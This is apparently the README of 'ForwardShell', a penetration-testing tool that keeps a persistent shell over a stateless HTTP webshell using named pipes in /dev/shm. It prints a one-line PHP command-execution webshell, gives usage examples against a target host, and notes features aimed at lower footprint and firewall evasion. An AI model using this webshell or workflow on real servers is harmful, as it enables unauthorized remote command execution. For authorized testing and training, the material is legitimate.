# ForwardShell

A Python-based tool designed to create a semi-interactive shell session over a stateless HTTP Webshell.

## Credits and Inspiration

This tool is a modernized refactoring and Python implementation inspired by the original **forward-shell** concept developed by IppSec.

Original Repository: [https://github.com/IppSec/forward-shell.git](https://github.com/IppSec/forward-shell.git)

## Description

Standard HTTP webshells are stateless: every command executes in a new process context. Consequently, environment variables are lost between requests, and directory changes (via `cd`) do not persist.

ForwardShell bridges this gap by creating named pipes (FIFOs) on the target server. It establishes a persistent input/output stream, allowing the user to simulate a terminal environment where the shell context is preserved. This is particularly useful when outbound connections (Reverse Shells) are blocked by firewalls.

## Features

* **Session Persistence:** Maintains a shell session using named pipes (`mkfifo`), allowing for command history within the session and persistent variables.
* **PTY Upgrade:** Automates the upgrade to a Pseudo-Terminal (PTY) using Python or the `script` command to enable interactive features (e.g., `su`, `sudo`, colored prompts).
* **Method Support:** Fully supports both GET and POST HTTP methods.
* **Stealthier Output:** Utilizes shared memory (`/dev/shm`) for pipe creation to minimize disk I/O and footprint.
* **History Support:** Optional integration with `readline` for local command history and navigation (toggleable via the `-r` flag).

## Prerequisites

### Local Machine

* Python 3
* `requests` library

```bash
pip install -r requirements.txt

```

### Target Machine

* A basic webshell already uploaded (e.g., `<?php system($_GET['cmd']); ?>`).
* Linux Operating System.
* Write permissions in `/dev/shm` (standard on most Linux systems).
* Standard utilities: `mkfifo`, `tail`, `cat`.

## Usage

```text
usage: forward-shell_get-post.py [-h] -u URL [-m METHOD] [-p PARAM] [--upgrade] [--no-python] [-r]

optional arguments:
  -h, --help            show this help message and exit
  -u URL, --url URL     Target URL
  -m METHOD, --method METHOD
                        HTTP Method (GET/POST) [Default: GET]
  -p PARAM, --param PARAM
                        Parameter name [Default: cmd]
  --upgrade             Auto-upgrade to PTY on startup
  --no-python           Do not use Python for PTY upgrade (forces 'script')
  -r, --readline        Enable readline (history and arrow keys) [Warning: Laggy]

```

## Examples

### Basic Connection

Connect to a webshell using the default GET method and 'cmd' parameter:

```bash
python3 forward-shell_get-post.py -u http://target.com/shell.php

```

### POST Method with Custom Parameter

If the webshell uses POST and expects the parameter 'c':

```bash
python3 forward-shell_get-post.py -u http://target.com/shell.php -m POST -p c

```

### Full Interactive PTY Upgrade

Automatically upgrade to a PTY upon connection. This is the recommended mode for a near-native shell experience:

```bash
python3 forward-shell_get-post.py -u http://target.com/shell.php --upgrade

```

### Legacy Systems (No Python on Target)

If the target machine does not have Python installed, use this flag to force the usage of the `script` binary for PTY upgrading:

```bash
python3 forward-shell_get-post.py -u http://target.com/shell.php --upgrade --no-python

```

### Enable History (Experimental)

Enable local command history (up/down arrows). Note that this may introduce input lag due to the nature of HTTP tunneling:

```bash
python3 forward-shell_get-post.py -u http://target.com/shell.php -r

```

## Disclaimer

This tool is intended for legal security auditing and educational purposes only. Usage of this tool for attacking targets without prior mutual consent is illegal. The developer and the original concept creator assume no liability and are not responsible for any misuse or damage caused by this program.
